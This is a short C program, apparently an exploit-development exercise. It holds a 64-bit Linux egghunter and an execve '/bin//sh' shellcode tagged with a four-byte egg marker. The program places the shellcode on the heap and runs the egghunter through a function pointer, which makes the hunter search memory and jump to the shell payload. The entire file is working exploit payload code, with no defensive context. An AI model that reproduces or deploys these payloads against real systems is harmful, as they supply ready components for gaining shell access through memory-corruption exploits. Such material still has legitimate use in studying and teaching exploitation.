#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define EGG "\x90\x50\x90\x50"  // 0x50905090

unsigned char egg[] = EGG;

unsigned char egghunter[] = \
"\x31\xff\xf7\xe7\x96\xff\xc2\xc1\xe2\x0c\x48\x8d\x3c\x17\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xf3\xb8\x8f\x50\x90\x50\xfe\xc0\xaf\x75\xf6\xaf\x75\xf3\xff\xe7";


unsigned char code[] = \
EGG
EGG
"\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main() {

  char *heap = (char*)malloc(1000000);
  memset(heap, '\0', 512);
  strcpy(heap, egg);
  strcpy(heap+4, egg);
  strcpy(heap+8, code);

  printf("Shellcode length: %zu\n", strlen(code));
  printf("Egghunter length: %zu\n", strlen(egghunter));
  printf("Shellcode location: %p\n", heap);
  int (*ret)() = (int(*)())egghunter;
  ret();
}
